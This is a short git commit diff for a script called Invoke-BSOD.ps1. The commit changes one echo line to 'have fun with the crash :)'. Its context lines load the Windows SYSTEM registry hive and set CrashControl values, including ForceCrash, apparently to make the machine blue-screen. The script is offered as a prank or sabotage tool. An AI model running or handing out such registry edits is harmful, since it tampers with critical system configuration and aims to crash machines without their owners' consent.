5f67b49763a99013d0252433b3420279603f4fd6
hunterhudspeth2030-arch <hunterhudspeth2030@gmail.com>
2025-10-18 23:19:11 -0700

    Update Invoke-BSOD.ps1

--- Invoke-BSOD.ps1
+++ Invoke-BSOD.ps1
@@ -4,5 +4,6 @@ echo Y|reg load HKLM\bsod C:\Windows\System32\config\SYSTEM
 reg add HKLM\bsod\ControlSet001\Control\CrashControl /v CrashDumpEnabled /t REG_DWORD /d 1 /f
 reg add HKLM\bsod\ControlSet001\Control\CrashControl /v ForceCrash /t REG_DWORD /d 1 /f
 reg unload HKLM\bsod
-echo ""
+echo "have fun with the crash :)"
 start /wait notepad.exe
+
